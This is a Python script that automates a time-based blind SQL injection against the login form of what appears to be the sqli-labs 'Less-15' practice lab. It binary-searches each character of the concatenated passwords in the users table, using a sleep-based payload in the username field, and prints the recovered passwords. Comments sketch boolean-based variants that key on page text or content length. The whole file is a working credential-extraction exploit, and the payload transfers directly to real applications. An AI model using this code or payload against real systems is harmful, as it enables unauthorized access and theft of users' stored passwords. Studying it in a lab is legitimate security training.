#!/usr/bin/python3
# coding: utf-8
import requests

url = "http://10.10.1.71/Less-15/"
password_data = ""
ascii_list = range(32, 128)
j = 0
num = 0
# str1 = "You are in"
# str2 = "You have an error in your SQL syntax"

while(True):
    j += 1
    arr = ascii_list
    start = 0
    end = len(arr)

    while(start < end):
        num += 1
        mid = (start + end)//2
        k = arr[mid]

        payload = "admin' and if((select ord(substr(group_concat(password),%s,1)) from users)>%s,sleep(0.1),1)-- " % (j, k)
        data = {'uname': payload, 'passwd': 'aaa', 'submit': 'Submit'}
        response = requests.post(url, data=data)
        response.encoding = 'utf-8'

        # 基于页面内容不同,blind injection for boolian based
        # page_Content = response.text
        # if str1 in page_Content:

        # 基于响应header中content-length不同,blind injection for boolian based
        # page_byte = response.headers['Content-Length']
        # if int(page_byte) < 452:

        # 基于页面延迟时间不同,blind injection for time based
        page_time = response.elapsed.total_seconds()
        if page_time > 0.1:
            if end - start == 1:
                now_word = chr(arr[end])
                password_data += now_word
                break
            else:
                start = mid
        else:
            end = mid
            now_word = ""
    if now_word == "":
        break
    print(num, '___', password_data)
print('password_data:', password_data)